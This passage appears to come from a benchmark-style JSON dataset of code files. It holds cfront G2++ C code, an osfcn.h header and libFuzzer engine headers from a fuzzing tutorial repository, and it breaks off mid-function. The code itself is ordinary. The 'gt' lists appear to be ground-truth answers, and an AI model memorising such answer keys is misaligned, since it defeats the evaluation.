clearleaf\\n\";)\n\t\t\tclearleaf(p,rd->size);\n\t\t}\n\n\t}\n\telse if (rd->type == 'A') {\n\n\n\n\n\n\n\n\n\n\t\tDEBUG(cerr << \"Record is an array\\n\";)\n\t\tint nel = ((Vb_ATTLC*)p)->size();\n\t\tDEBUG(cerr << \"rd->nel=\" << rd->nel << \"\\n\"\n\t\t\t<< \"nel=\" << nel << \"\\n\";)\n\t\tint elt_size = REALSIZE(rd->child->size);\n\t\tDEBUG(cerr << \"rd->child->size=\" << rd->child->size\n\t\t\t<< \"\\n\" << \"elt_size=\" << elt_size << \"\\n\";)\n\t\tif (elt_size == 0) {\n\t\t\telt_size = rd->child->nel;\n\t\t}\n\n\t\tint index;\n\t\tvoid* ep;\n\n\n\t\tG2DESC *child_ptr = rd->child;\n\t\tindex = 0;\n\t\tep = ((Vb_ATTLC*)p)->beginning();\n\n\n\n\t\tif (child_ptr->type == 'L') {\n\t\t\tif (child_ptr->size == 0) {\n\t\t\t\tfor ( ; index<nel; index++, ep = (char*)ep + elt_size) {\n\t\t\t\t\tchild_ptr->nfn(ep);\n\t\t\t\t}\n\t\t\t}\n\t\t\telse {\n\t\t\t\tfor ( ; index<nel; index++, ep = (char*)ep + elt_size) {\n\t\t\t\t\tclearleaf(ep,child_ptr->size);\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\telse {\n\n\n\t\t\tfor ( ;\n\t\t\t\tindex<nel;\n\t\t\t\tindex++, ep = (char*)ep + elt_size\n\t\t\t){\n\t\t\t\tDEBUG(cerr << \"in for loop\\n\" << \"\tindex=\"\n\t\t\t\t\t<< index << \"\\n\" << \"\tep=\"\n\t\t\t\t\t<< (void*)ep << \"\\n\";)\n\n\n\n\t\t\t\tDEBUG(cerr << \"call g2clear_ATTLC recursively\\n\";)\n\t\t\t\tg2clear_ATTLC(rd->child, ep);\n\t\t\t\tDEBUG(cerr << \"for index \" << index << \", ep=\"\n\t\t\t\t\t<< (void*)ep << \"\\n\";)\n\t\t\t}\n\t\t}\n\t}\n\telse {\n\n\t\tDEBUG(cerr << \"Record is a structure\\n\";)\n\t\tG2DESC* child = rd->child;\n\t\tint nel;\n\n\t\tfor (nel=rd->nel; nel>0; nel--,child++) {\n\t\t\tDEBUG(cerr << \"in loop, consider child:\\n\";)\n\t\t\tDEBUG(showdesc_ATTLC(child);)\n\t\t\tvoid* childbase = (char*)p + child->offset;\n\t\t\tDEBUG(cerr << \"compute childbase:\\n\"\n\t\t\t\t<< \"\tp=\" << (void*)p\n\t\t\t\t<< \"\\n\" << \"\tchild->offset=\"\n\t\t\t\t<< child->offset << \"\\n\"\n\t\t\t\t<< \"\tchildbase=\" << (void*)childbase\n\t\t\t\t<< \"\\n\";)\n\n\n\t\t\tif (child->type == 'L') {\n\t\t\t\tif (child->size == 0) {\n\t\t\t\t\tDEBUG(cerr << \"gonna try to clear a user-defined type:\\n\";)\n\t\t\t\t\tchild->nfn(childbase);\n\t\t\t\t}\n\t\t\t\telse {\n\t\t\t\t\tDEBUG(cerr << \"Its type is builtin\\n\";)\n\t\t\t\t\tDEBUG(cerr << \"Ready to call clearleaf\\n\");\n\t\t\t\t\tclearleaf(childbase,child->size);\n\t\t\t\t}\n\t\t\t}\n\t\t\telse {\n\t\t\t\tDEBUG(cerr << \"ready to call g2clear_ATTLC recursively\\n\";)\n\t\t\t\tg2clear_ATTLC(child, childbase);\n\t\t\t}\n\t\t}\n\t}\n\tDEBUG(cerr << \"ready to return from g2clear_ATTLC\\n\";)\n}\n\n\n\nstatic void\nclearleaf(void* p, int code) {\n\tDEBUG(cerr << \"enter clearleaf with\\n\" << \"\tp=\"\n\t\t<< (void*)p << \"\tcode=\" << code << \"\\n\";)\n\n\tswitch (code) {\n\tcase LONG_INT_ATTLC+1:{\n\t\tDEBUG(cerr << \"LONG\" << \"\\n\";)\n\t\t*((long*)p)=0;\n\t\tbreak;\n\t}\n\tcase SHORT_INT_ATTLC+1:{\n\t\tDEBUG(cerr << \"SHORT\" << \"\\n\";)\n\t\t*((short*)p)=0;\n\t\tbreak;\n\t}\n\tcase CHAR_INT_ATTLC+1:{\n\t\tDEBUG(cerr << \"CHAR\" << \"\\n\";)\n\t\t*((char*)p)=0;\n\t\tbreak;\n\t}\n\tcase STRING_INT_ATTLC+1:{\n\t\tDEBUG(cerr << \"STRING\\n\";)\n\t\t*((String*)p)=\"\";\n\t\tbreak;\n\t}\n\tdefault:{\n\t\tg2err_ATTLC = G2BADLEAF;\n\t\tbreak;\n\t}\n\t}\n\tDEBUG(cerr << \"ready to return from clearleaf\\n\";)\n}\n\n'cfront-3/incl-master/incl-linux32/osfcn.h'\n:#ifndef __OSFCN_H\n#define __OSFCN_H 1\n\n#include <sys/types.h>\n#include <fcntl.h>\n#include <grp.h>\n#include <pwd.h>\n#include <signal.h>\n#include <stdlib.h>\n#include <time.h>\n#include <unistd.h>\n#include <utime.h>\n#include <sys/wait.h>\n\n#endif\n",
        "gt": [
            "'cfront-3/incl-master/incl-linux32/pwd.h'",
            "'cfront-3/incl-master/incl-linux32/osfcn.h'",
            "'cfront-3/libSC/G2++/g2++lib/getrec.c'"
        ]
    },
    {
        "files": [
            "'the-art-of-fuzzing/Chapter 2  Static & Dynamic Fuzzing/AFL/dynamic_fuzz/libfuzzer-example/libfuzzer-workshop/libFuzzer/Fuzzer/FuzzerBuiltinsMsvc.h'",
            "'the-art-of-fuzzing/Chapter 2  Static & Dynamic Fuzzing/AFL/dynamic_fuzz/libfuzzer-example/libfuzzer-workshop/libFuzzer/Fuzzer/FuzzerDictionary.h'",
            "'the-art-of-fuzzing/Chapter 2  Static & Dynamic Fuzzing/AFL/dynamic_fuzz/libfuzzer-example/libfuzzer-workshop/libFuzzer/Fuzzer/FuzzerUtil.h'",
            "'the-art-of-fuzzing/Chapter 2  Static & Dynamic Fuzzing/AFL/dynamic_fuzz/libfuzzer-example/libfuzzer-workshop/libFuzzer/Fuzzer/FuzzerCorpus.h'",
            "'the-art-of-fuzzing/Chapter 2  Static & Dynamic Fuzzing/AFL/dynamic_fuzz/libfuzzer-example/libfuzzer-workshop/libFuzzer/Fuzzer/FuzzerTracePC.h'"
        ],
        "content": "'the-art-of-fuzzing/Chapter 2  Static & Dynamic Fuzzing/AFL/dynamic_fuzz/libfuzzer-example/libfuzzer-workshop/libFuzzer/Fuzzer/FuzzerBuiltinsMsvc.h'\n:\n\n\n\n\n\n\n\n\n\n\n#ifndef LLVM_FUZZER_BUILTINS_MSVC_H\n#define LLVM_FUZZER_BUILTINS_MSVC_H\n\n#include \"FuzzerDefs.h\"\n\n#if LIBFUZZER_MSVC\n#include <intrin.h>\n#include <cstdint>\n#include <cstdlib>\n\n\n\n#define GET_CALLER_PC() _ReturnAddress()\n\nnamespace fuzzer {\n\ninline uint8_t  Bswap(uint8_t x)  { return x; }\n\n\ninline uint16_t Bswap(uint16_t x) { return _byteswap_ushort(x); }\ninline uint32_t Bswap(uint32_t x) { return _byteswap_ulong(x); }\ninline uint64_t Bswap(uint64_t x) { return _byteswap_uint64(x); }\n\n\n\n\ninline uint32_t Clzll(uint64_t X) {\n  unsigned long LeadZeroIdx = 0;\n\n#if !defined(_M_ARM) && !defined(_M_X64)\n\n  if (_BitScanReverse(&LeadZeroIdx, static_cast<unsigned long>(X >> 32)))\n    return static_cast<int>(63 - (LeadZeroIdx + 32));\n\n  if (_BitScanReverse(&LeadZeroIdx, static_cast<unsigned long>(X)))\n    return static_cast<int>(63 - LeadZeroIdx);\n\n#else\n  if (_BitScanReverse64(&LeadZeroIdx, X)) return 63 - LeadZeroIdx;\n#endif\n  return 64;\n}\n\ninline uint32_t Clz(uint32_t X) {\n  unsigned long LeadZeroIdx = 0;\n  if (_BitScanReverse(&LeadZeroIdx, X)) return 31 - LeadZeroIdx;\n  return 32;\n}\n\ninline int Popcountll(unsigned long long X) {\n#if !defined(_M_ARM) && !defined(_M_X64)\n  return __popcnt(X) + __popcnt(X >> 32);\n#else\n  return __popcnt64(X);\n#endif\n}\n\n}\n\n#endif\n#endif\n\n'the-art-of-fuzzing/Chapter 2  Static & Dynamic Fuzzing/AFL/dynamic_fuzz/libfuzzer-example/libfuzzer-workshop/libFuzzer/Fuzzer/FuzzerDictionary.h'\n:\n\n\n\n\n\n\n\n\n\n#ifndef LLVM_FUZZER_DICTIONARY_H\n#define LLVM_FUZZER_DICTIONARY_H\n\n#include \"FuzzerDefs.h\"\n#include \"FuzzerIO.h\"\n#include \"FuzzerUtil.h\"\n#include <algorithm>\n#include <limits>\n\nnamespace fuzzer {\n\ntemplate <size_t kMaxSizeT> class FixedWord {\npublic:\n  static const size_t kMaxSize = kMaxSizeT;\n  FixedWord() {}\n  FixedWord(const uint8_t *B, uint8_t S) { Set(B, S); }\n\n  void Set(const uint8_t *B, uint8_t S) {\n    assert(S <= kMaxSize);\n    memcpy(Data, B, S);\n    Size = S;\n  }\n\n  bool operator==(const FixedWord<kMaxSize> &w) const {\n    return Size == w.Size && 0 == memcmp(Data, w.Data, Size);\n  }\n\n  static size_t GetMaxSize() { return kMaxSize; }\n  const uint8_t *data() const { return Data; }\n  uint8_t size() const { return Size; }\n\nprivate:\n  uint8_t Size = 0;\n  uint8_t Data[kMaxSize];\n};\n\ntypedef FixedWord<64> Word;\n\nclass DictionaryEntry {\n public:\n  DictionaryEntry() {}\n  DictionaryEntry(Word W) : W(W) {}\n  DictionaryEntry(Word W, size_t PositionHint) : W(W), PositionHint(PositionHint) {}\n  const Word &GetW() const { return W; }\n\n  bool HasPositionHint() const { return PositionHint != std::numeric_limits<size_t>::max(); }\n  size_t GetPositionHint() const {\n    assert(HasPositionHint());\n    return PositionHint;\n  }\n  void IncUseCount() { UseCount++; }\n  void IncSuccessCount() { SuccessCount++; }\n  size_t GetUseCount() const { return UseCount; }\n  size_t GetSuccessCount() const {return SuccessCount; }\n\n  void Print(const char *PrintAfter = \"\\n\") {\n    PrintASCII(W.data(), W.size());\n    if (HasPositionHint())\n      Printf(\"@%zd\", GetPositionHint());\n    Printf(\"%s\", PrintAfter);\n  }\n\nprivate:\n  Word W;\n  size_t PositionHint = std::numeric_limits<size_t>::max();\n  size_t UseCount = 0;\n  size_t SuccessCount = 0;\n};\n\nclass Dictionary {\n public:\n  static const size_t kMaxDictSize = 1 << 14;\n\n  bool ContainsWord(const Word &W) const {\n    return std::any_of(begin(), end(), [&](const DictionaryEntry &DE) {\n      return DE.GetW() == W;\n    });\n  }\n  const DictionaryEntry *begin() const { return &DE[0]; }\n  const DictionaryEntry *end() const { return begin() + Size; }\n  DictionaryEntry & operator[] (size_t Idx) {\n    assert(Idx < Size);\n    return DE[Idx];\n  }\n  void push_back(DictionaryEntry DE) {\n    if (Size < kMaxDictSize)\n      this->DE[Size++] = DE;\n  }\n  void clear() { Size = 0; }\n  bool empty() const { return Size == 0; }\n  size_t size() const { return Size; }\n\nprivate:\n  DictionaryEntry DE[kMaxDictSize];\n  size_t Size = 0;\n};\n\n\n\n\nbool ParseOneDictionaryEntry(const std::string &Str, Unit *U);\n\n\nbool ParseDictionaryFile(const std::string &Text, Vector<Unit> *Units);\n\n}\n\n#endif\n\n'the-art-of-fuzzing/Chapter 2  Static & Dynamic Fuzzing/AFL/dynamic_fuzz/libfuzzer-example/libfuzzer-workshop/libFuzzer/Fuzzer/FuzzerUtil.h'\n:\n\n\n\n\n\n\n\n\n\n#ifndef LLVM_FUZZER_UTIL_H\n#define LLVM_FUZZER_UTIL_H\n\n#include \"FuzzerBuiltins.h\"\n#include \"FuzzerBuiltinsMsvc.h\"\n#include \"FuzzerCommand.h\"\n#include \"FuzzerDefs.h\"\n\nnamespace fuzzer {\n\nvoid PrintHexArray(const Unit &U, const char *PrintAfter = \"\");\n\nvoid PrintHexArray(const uint8_t *Data, size_t Size,\n                   const char *PrintAfter = \"\");\n\nvoid PrintASCII(const uint8_t *Data, size_t Size, const char *PrintAfter = \"\");\n\nvoid PrintASCII(const Unit &U, const char *PrintAfter = \"\");\n\n\n\nbool ToASCII(uint8_t *Data, size_t Size);\n\nbool IsASCII(const Unit &U);\n\nbool IsASCII(const uint8_t *Data, size_t Size);\n\nstd::string Base64(const Unit &U);\n\nvoid PrintPC(const char *SymbolizedFMT, const char *FallbackFMT, uintptr_t PC);\n\nstd::string DescribePC(const char *SymbolizedFMT, uintptr_t PC);\n\nvoid PrintStackTrace();\n\nvoid PrintMemoryProfile();\n\nunsigned NumberOfCpuCores();\n\n\nvoid SetSignalHandler(const FuzzingOptions& Options);\n\nvoid SleepSeconds(int Seconds);\n\nunsigned long GetPid();\n\nsize_t GetPeakRSSMb();\n\nint ExecuteCommand(const Command &Cmd);\n\nFILE *OpenProcessPipe(const char *Command, const char *Mode);\n\nconst void *SearchMemory(const void *haystack, size_t haystacklen,\n                         const void *needle, size_t needlelen);\n\nstd::string CloneArgsWithoutX(const Vector<std::string> &Args,\n                              const char *X1, const char *X2);\n\ninline std::string CloneArgsWithoutX(const Vector<std::string> &Args,\n                                     const char *X) {\n  return CloneArgsWithoutX(Args, X, X);\n}\n\ninline std::pair<std::string, std::string> SplitBefore(std::string X,\n                                                       std::string S) {\n  auto Pos = S.find(X);\n  if (Pos == std::string::npos)\n    return std::make_pair(S, \"\");\n  return std::make_pair(S.substr(0, Pos), S.substr(Pos));\n}\n\nstd::string DisassembleCmd(const std::string &FileName);\n\nstd::string SearchRegexCmd(const std::string &Regex);\n\nsize_t SimpleFastHash(const uint8_t *Data, size_t Size);\n\ninline uint32_t Log(uint32_t X) { return 32 - Clz(X) - 1; }\n\ninline size_t PageSize() { return 4096; }\ninline uint8_t *RoundUpByPage(uint8_t *P) {\n  uintptr_t X = reinterpret_cast<uintptr_t>(P);\n  size_t Mask = PageSize() - 1;\n  X = (X + Mask) & ~Mask;\n  return reinterpret_cast<uint8_t *>(X);\n}\ninline uint8_t *RoundDownByPage(uint8_t *P) {\n  uintptr_t X = reinterpret_cast<uintptr_t>(P);\n  size_t Mask = PageSize() - 1;\n  X = X & ~Mask;\n  return reinterpret_cast<uint8_t *>(X);\n}\n\n}\n\n#endif\n\n'the-art-of-fuzzing/Chapter 2  Static & Dynamic Fuzzing/AFL/dynamic_fuzz/libfuzzer-example/libfuzzer-workshop/libFuzzer/Fuzzer/FuzzerCorpus.h'\n:\n\n\n\n\n\n\n\n\n\n#ifndef LLVM_FUZZER_CORPUS\n#define LLVM_FUZZER_CORPUS\n\n#include \"FuzzerDataFlowTrace.h\"\n#include \"FuzzerDefs.h\"\n#include \"FuzzerIO.h\"\n#include \"FuzzerRandom.h\"\n#include \"FuzzerSHA1.h\"\n#include \"FuzzerTracePC.h\"\n#include <algorithm>\n#include <numeric>\n#include <random>\n#include <unordered_set>\n\nnamespace fuzzer {\n\nstruct InputInfo {\n  Unit U;\n  uint8_t Sha1[kSHA1NumBytes];\n\n  size_t NumFeatures = 0;\n  size_t Tmp = 0;\n\n  size_t NumExecutedMutations = 0;\n  size_t NumSuccessfullMutations = 0;\n  bool MayDeleteFile = false;\n  bool Reduced = false;\n  bool HasFocusFunction = false;\n  Vector<uint32_t> UniqFeatureSet;\n  Vector<uint8_t> DataFlowTraceForFocusFunction;\n};\n\nclass InputCorpus {\n  static const size_t kFeatureSetSize = 1 << 21;\n public:\n  InputCorpus(const std::string &OutputCorpus) : OutputCorpus(OutputCorpus) {\n    memset(InputSizesPerFeature, 0, sizeof(InputSizesPerFeature));\n    memset(SmallestElementPerFeature, 0, sizeof(SmallestElementPerFeature));\n  }\n  ~InputCorpus() {\n    for (auto II : Inputs)\n      delete II;\n  }\n  size_t size() const { return Inputs.size(); }\n  size_t SizeInBytes() const {\n    size_t Res = 0;\n    for (auto II : Inputs)\n      Res += II->U.size();\n    return Res;\n  }\n  size_t NumActiveUnits() const {\n    size_t Res = 0;\n    for (auto II : Inputs)\n      Res += !II->U.empty();\n    return Res;\n  }\n  size_t MaxInputSize() const {\n    size_t Res = 0;\n    for (auto II : Inputs)\n        Res = std::max(Res, II->U.size());\n    return Res;\n  }\n\n  size_t NumInputsThatTouchFocusFunction() {\n    return std::count_if(Inputs.begin(), Inputs.end(), [](const InputInfo *II) {\n      return II->HasFocusFunction;\n    });\n  }\n\n  size_t NumInputsWithDataFlowTrace() {\n    return std::count_if(Inputs.begin(), Inputs.end(), [](const InputInfo *II) {\n      return !II->DataFlowTraceForFocusFunction.empty();\n    });\n  }\n\n  bool empty() const { return Inputs.empty(); }\n  const Unit &operator[] (size_t Idx) const { return Inputs[Idx]->U; }\n  InputInfo *AddToCorpus(const Unit &U, size_t NumFeatures, bool MayDeleteFile,\n                         bool HasFocusFunction,\n                         const Vector<uint32_t> &FeatureSet,\n                         const DataFlowTrace &DFT, const InputInfo *BaseII) {\n    assert(!U.empty());\n    if (FeatureDebug)\n      Printf(\"ADD_TO_CORPUS %zd NF %zd\\n\", Inputs.size(), NumFeatures);\n    Inputs.push_back(new InputInfo());\n    InputInfo &II = *Inputs.back();\n    II.U = U;\n    II.NumFeatures = NumFeatures;\n    II.MayDeleteFile = MayDeleteFile;\n    II.UniqFeatureSet = FeatureSet;\n    II.HasFocusFunction = HasFocusFunction;\n    std::sort(II.UniqFeatureSet.begin(), II.UniqFeatureSet.end());\n    ComputeSHA1(U.data(), U.size(), II.Sha1);\n    auto Sha1Str = Sha1ToString(II.Sha1);\n    Hashes.insert(Sha1Str);\n    if (HasFocusFunction)\n      if (auto V = DFT.Get(Sha1Str))\n        II.DataFlowTraceForFocusFunction = *V;\n\n\n\n    if (II.DataFlowTraceForFocusFunction.empty() && BaseII)\n      II.DataFlowTraceForFocusFunction = BaseII->DataFlowTraceForFocusFunction;\n    UpdateCorpusDistribution();\n    PrintCorpus();\n\n    return &II;\n  }\n\n\n  void PrintUnit(const Unit &U) {\n    if (!FeatureDebug) return;\n    for (uint8_t C : U) {\n      if (C != 'F' && C != 'U' && C != 'Z')\n        C = '.';\n      Printf(\"%c\", C);\n    }\n  }\n\n\n  void PrintFeatureSet(const Vector<uint32_t> &FeatureSet) {\n    if (!FeatureDebug) return;\n    Printf(\"{\");\n    for (uint32_t Feature: FeatureSet)\n      Printf(\"%u,\", Feature);\n    Printf(\"}\");\n  }\n\n\n  void PrintCorpus() {\n    if (!FeatureDebug) return;\n    Printf(\"======= CORPUS:\\n\");\n    int i = 0;\n    for (auto II : Inputs) {\n      if (std::find(II->U.begin(), II->U.end(), 'F') != II->U.end()) {\n        Printf(\"[%2d] \", i);\n        Printf(\"%s sz=%zd \", Sha1ToString(II->Sha1).c_str(), II->U.size());\n        PrintUnit(II->U);\n        Printf(\" \");\n        PrintFeatureSet(II->UniqFeatureSet);\n        Printf(\"\\n\");\n      }\n      i++;\n    }\n  }\n\n  void Replace(InputInfo *II, const Unit &U) {\n    assert(II->U.size() > U.size());\n    Hashes.erase(Sha1ToString(II->Sha1));\n    DeleteFile(*II);\n    ComputeSHA1(U.data(), U.size(), II->Sha1);\n    Hashes.insert(Sha1ToString(II->Sha1));\n    II->U = U;\n    II->Reduced = true;\n    UpdateCorpusDistribution();\n  }\n\n  bool HasUnit(const Unit &U) { return Hashes.count(Hash(U)); }\n  bool HasUnit(const std::string &H) { return Hashes.count(H); }\n  InputInfo &ChooseUnitToMutate(Random &Rand) {\n    InputInfo &II = *Inputs[ChooseUnitIdxToMutate(Rand)];\n    assert(!II.U.empty());\n    return II;\n  }\n\n\n  size_t ChooseUnitIdxToMutate(Random &Rand) {\n    size_t Idx = static_cast<size_t>(CorpusDistribution(Rand));\n    assert(Idx < Inputs.size());\n    return Idx;\n  }\n\n  void PrintStats() {\n    for (size_t i = 0; i < Inputs.size(); i++) {\n      const auto &II = *Inputs[i];\n      Printf(\"  [% 3zd %s] sz: % 5zd runs: % 5zd succ: % 5zd focus: %d\\n\", i,\n             Sha1ToString(II.Sha1).c_str(), II.U.size(),\n             II.NumExecutedMutations, II.NumSuccessfullMutations, II.HasFocusFunction);\n    }\n  }\n\n  void PrintFeatureSet() {\n    for (size_t i = 0; i < kFeatureSetSize; i++) {\n      if(size_t Sz = GetFeature(i))\n        Printf(\"[%zd: id %zd sz%zd] \", i, SmallestElementPerFeature[i], Sz);\n    }\n    Printf(\"\\n\\t\");\n    for (size_t i = 0; i < Inputs.size(); i++)\n      if (size_t N = Inputs[i]->NumFeatures)\n        Printf(\" %zd=>%zd \", i, N);\n    Printf(\"\\n\");\n  }\n\n  void DeleteFile(const InputInfo &II) {\n    if (!OutputCorpus.empty() && II.MayDeleteFile)\n      RemoveFile(DirPlusFile(OutputCorpus, Sha1ToString(II.Sha1)));\n  }\n\n  void DeleteInput(size_t Idx) {\n    InputInfo &II = *Inputs[Idx];\n    DeleteFile(II);\n    Unit().swap(II.U);\n    if (FeatureDebug)\n      Printf(\"EVICTED %zd\\n\", Idx);\n  }\n\n  bool AddFeature(size_t Idx, uint32_t NewSize, bool Shrink) {\n    assert(NewSize);\n    Idx = Idx % kFeatureSetSize;\n    uint32_t OldSize = GetFeature(Idx);\n    if (OldSize == 0 || (Shrink && OldSize > NewSize)) {\n      if (OldSize > 0) {\n        size_t OldIdx = SmallestElementPerFeature[Idx];\n        InputInfo &II = *Inputs[OldIdx];\n        assert(II.NumFeatures > 0);\n        II.NumFeatures--;\n        if (II.NumFeatures == 0)\n          DeleteInput(OldIdx);\n      } else {\n        NumAddedFeatures++;\n      }\n      NumUpdatedFeatures++;\n      if (FeatureDebug)\n        Printf(\"ADD FEATURE %zd sz %d\\n\", Idx, NewSize);\n      SmallestElementPerFeature[Idx] = Inputs.size();\n      InputSizesPerFeature[Idx] = NewSize;\n      return true;\n    }\n    return false;\n  }\n\n  size_t NumFeatures() const { return NumAddedFeatures; }\n  size_t NumFeatureUpdates() const { return NumUpdatedFeatures; }\n\nprivate:\n\n  static const bool FeatureDebug = false;\n\n  size_t GetFeature(size_t Idx) const { return InputSizesPerFeature[Idx]; }\n\n  void ValidateFeatureSet() {\n    if (FeatureDebug)\n      PrintFeatureSet();\n    for (size_t Idx = 0; Idx < kFeatureSetSize; Idx++)\n      if (GetFeature(Idx))\n        Inputs[SmallestElementPerFeature[Idx]]->Tmp++;\n    for (auto II: Inputs) {\n      if (II->Tmp != II->NumFeatures)\n        Printf(\"ZZZ %zd %zd\\n\", II->Tmp, II->NumFeatures);\n      assert(II->Tmp == II->NumFeatures);\n      II->Tmp = 0;\n    }\n  }\n\n\n\n\n\n\n\n  void UpdateCorpusDistribution() {\n    size_t N = Inputs.size();\n    assert(N);\n    Intervals.resize(N + 1);\n    Weights.resize(N);\n    std::iota(Intervals.begin(), Intervals.end(), 0);\n    for (size_t i = 0; i < N; i++)\n      Weights[i] = Inputs[i]->NumFeatures\n                       ? (i + 1) * (Inputs[i]->HasFocusFunction ? 1000 : 1)\n                       : 0.;\n    if (FeatureDebug) {\n      for (size_t i = 0; i < N; i++)\n        Printf(\"%zd \", Inputs[i]->NumFeatures);\n      Printf(\"SCORE\\n\");\n      for (size_t i = 0; i < N; i++)\n        Printf(\"%f \", Weights[i]);\n      Printf(\"Weights\\n\");\n    }\n    CorpusDistribution = std::piecewise_constant_distribution<double>(\n        Intervals.begin(), Intervals.end(), Weights.begin());\n  }\n  std::piecewise_constant_distribution<double> CorpusDistribution;\n\n  Vector<double> Intervals;\n  Vector<double> Weights;\n\n  std::unordered_set<std::string> Hashes;\n  Vector<InputInfo*> Inputs;\n\n  size_t NumAddedFeatures = 0;\n  size_t NumUpdatedFeatures = 0;\n  uint32_t InputSizesPerFeature[kFeatureSetSize];\n  uint32_t SmallestElementPerFeature[kFeatureSetSize];\n\n  std::string OutputCorpus;\n};\n\n}\n\n#endif\n\n'the-art-of-fuzzing/Chapter 2  Static & Dynamic Fuzzing/AFL/dynamic_fuzz/libfuzzer-example/libfuzzer-workshop/libFuzzer/Fuzzer/FuzzerTracePC.h'\n:\n\n\n\n\n\n\n\n\n\n#ifndef LLVM_FUZZER_TRACE_PC\n#define LLVM_FUZZER_TRACE_PC\n\n#include \"FuzzerDefs.h\"\n#include \"FuzzerDictionary.h\"\n#include \"FuzzerValueBitMap.h\"\n\n#include <set>\n#include <unordered_map>\n\nnamespace fuzzer {\n\n\n\n\n\n\n\n\ntemplate<class T, size_t kSizeT>\nstruct TableOfRecentCompares {\n  static const size_t kSize = kSizeT;\n  struct Pair {\n    T A, B;\n  };\n  ATTRIBUTE_NO_SANITIZE_ALL\n  void Insert(size_t Idx, const T &Arg1, const T &Arg2) {\n    Idx = Idx % kSize;\n    Table[Idx].A = Arg1;\n    Table[Idx].B = Arg2;\n  }\n\n  Pair Get(size_t I) { return Table[I % kSize]; }\n\n  Pair Table[kSize];\n};\n\ntemplate <size_t kSizeT>\nstruct MemMemTable {\n  static const size_t kSize = kSizeT;\n  Word MemMemWords[kSize];\n  Word EmptyWord;\n\n  void Add(const uint8_t *Data, size_t Size) {\n    if (Size <= 2) return;\n    Size = std::min(Size, Word::GetMaxSize());\n    size_t Idx = SimpleFastHash(Data, Size) % kSize;\n    MemMemWords[Idx].Set(Data, Size);\n  }\n  const Word &Get(size_t Idx) {\n    for (size_t i = 0; i < kSize; i++) {\n      const Word &W = MemMemWords[(Idx + i) % kSize];\n      if (W.size()) return W;\n    }\n    EmptyWord.Set(nullptr, 0);\n    return EmptyWord;\n  }\n};\n\nclass TracePC {\n public:\n  void HandleInline8bitCountersInit(uint8_t *Start, uint8_t *Stop);\n  void HandlePCsInit(const uintptr_t *Start, const uintptr_t *Stop);\n  void HandleCallerCallee(uintptr_t Caller, uintptr_t Callee);\n  template <class T> void HandleCmp(uintptr_t PC, T Arg1, T Arg2);\n  size_t GetTotalPCCoverage();\n  void SetUseCounters(bool UC) { UseCounters = UC; }\n  void SetUseValueProfileMask(uint32_t VPMask) { UseValueProfileMask = VPMask; }\n  void SetPrintNewPCs(bool P) { DoPrintNewPCs = P; }\n  void SetPrintNewFuncs(size_t P) { NumPrintNewFuncs = P; }\n  void UpdateObservedPCs();\n  template <class Callback> void CollectFeatures(Callback CB) const;\n\n  void ResetMaps() {\n    ValueProfileMap.Reset();\n    ClearExtraCounters();\n    ClearInlineCounters();\n  }\n\n  void ClearInlineCounters();\n\n  void UpdateFeatureSet(size_t CurrentElementIdx, size_t CurrentElementSize);\n  void PrintFeatureSet();\n\n  void PrintModuleInfo();\n\n  void PrintCoverage();\n\n  template<class CallBack>\n  void IterateCoveredFunctions(CallBack CB);\n\n  void AddValueForMemcmp(void *caller_pc, const void *s1, const void *s2,\n                         size_t n, bool StopAtZero);\n\n  TableOfRecentCompares<uint32_t, 32> TORC4;\n  TableOfRecentCompares<uint64_t, 32> TORC8;\n  TableOfRecentCompares<Word, 32> TORCW;\n  MemMemTable<1024> MMT;\n\n  void RecordInitialStack();\n  uintptr_t GetMaxStackOffset() const;\n\n  template<class CallBack>\n  void ForEachObservedPC(CallBack CB) {\n    for (auto PC : ObservedPCs)\n      CB(PC);\n  }\n\n  void SetFocusFunction(const std::string &FuncName);\n  bool ObservedFocusFunction();\n\n  struct PCTableEntry {\n    uintptr_t PC, PCFlags;\n  };\n\n  uintptr_t PCTableEntryIdx(const PCTableEntry *TE);\n  const PCTableEntry *PCTableEntryByIdx(uintptr_t Idx);\n  static uintptr_t GetNextInstructionPc(uintptr_t PC);\n  bool PcIsFuncEntry(const PCTableEntry *TE) { return TE->PCFlags & 1; }\n\nprivate:\n  bool UseCounters = false;\n  uint32_t UseValueProfileMask = false;\n  bool DoPrintNewPCs = false;\n  size_t NumPrintNewFuncs = 0;\n\n\n\n\n  struct Module {\n    struct Region {\n      uint8_t *Start, *Stop;\n      bool Enabled;\n      bool OneFullPage;\n    };\n    Region *Regions;\n    size_t NumRegions;\n    uint8_t *Start() { return Regions[0].Start; }\n    uint8_t *Stop()  { return Regions[NumRegions - 1].Stop; }\n    size_t Size()   { return Stop() - Start(); }\n    size_t  Idx(uint8_t *P) {\n      assert(P >= Start() && P < Stop());\n      return P - Start();\n    }\n  };\n\n  Module Modules[4096];\n  size_t NumModules;\n  size_t NumInline8bitCounters;\n\n  template <class Callback>\n  void IterateCounterRegions(Callback CB) {\n    for (size_t m = 0; m < NumModules; m++)\n      for (size_t r = 0; r < Modules[m].NumRegions; r++)\n        CB(Modules[m].Regions[r]);\n  }\n\n  struct { const PCTableEntry *Start, *Stop; } ModulePCTable[4096];\n  size_t NumPCTables;\n  size_t NumPCsInPCTables;\n\n  Set<const PCTableEntry*> ObservedPCs;\n  std::unordered_map<uintptr_t, uintptr_t> ObservedFuncs;\n\n  uint8_t *FocusFunctionCounterPtr = nullptr;\n\n  ValueBitMap ValueProfileMap;\n  uintptr_t InitialStack;\n};\n\ntemplate <class Callback>\n\nATTRIBUTE_NO_SANITIZE_ALL\nsize_t ForEachNonZeroByte(const uint8_t *Begin, const uint8_t *End,\n                        size_t FirstFeature, Callback Handle8bitCounter) {\n  typedef uintptr_t LargeType;\n  const size_t Step = sizeof(LargeType) / sizeof(uint8_t);\n  const size_t StepMask = Step - 1;\n  auto P = Begin;\n\n  for (; reinterpret_cast<uintptr_t>(P) & StepMask && P < End; P++)\n    if (uint8_t V = *P)\n      Handle8bitCounter(FirstFeature, P - Begin, V);\n\n\n  for (; P < End; P += Step)\n    if (LargeType Bundle = *reinterpret_cast<const LargeType *>(P))\n      for (size_t I = 0; I < Step; I++, Bundle >>= 8)\n        if (uint8_t V = Bundle & 0xff)\n          Handle8bitCounter(FirstFeature, P - Begin + I, V);\n\n\n  for (; P < End; P++)\n    if (uint8_t V = *P)\n      Handle8bitCounter(FirstFeature, P - Begin, V);\n  return End - Begin;\n}\n\n\ntemplate<class T>\nunsigned CounterToFeature(T Counter) {\n\n\n\n\n\n\n\n\n\n\n\n    assert(Counter);\n    unsigned Bit = 0;\n     if 